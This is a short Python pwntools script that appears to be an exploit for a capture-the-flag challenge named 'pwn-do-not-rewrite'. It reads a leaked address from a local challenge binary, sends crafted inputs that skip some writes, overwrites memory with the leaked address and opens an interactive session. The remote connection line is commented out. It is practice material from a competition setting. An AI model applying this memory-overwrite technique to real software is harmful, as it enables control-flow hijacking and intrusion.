from pwn import *


def double_pointer(pointer_value):
    """Convert x64 pointer to double representation"""
    byte_string = p64(pointer_value)
    double_string = struct.unpack("d", byte_string)[0]
    return double_string


host, port = "chal-lz56g6.wanictf.org", 9004

elf = ELF("./pwn-do-not-rewrite/chall")
context.binary = elf

# conn = remote(host, port)
conn = elf.process()

addr = conn.recvline().strip().split()[-1]
print(addr)
# addr = double_pointer(int(addr, 16))
addr = int(addr, 16)
print(addr)
print(p64(addr))
# conn.sendline(str(addr).encode())

for i in range(2):
    conn.sendline(b"a")
    conn.sendline(b"1")
    conn.sendline(b"1")

conn.sendline(b"a")
conn.sendline(b"1")
conn.sendline(b".")

conn.sendline(b"a")
conn.sendline(b".")
conn.sendline(p64(addr))

conn.interactive()
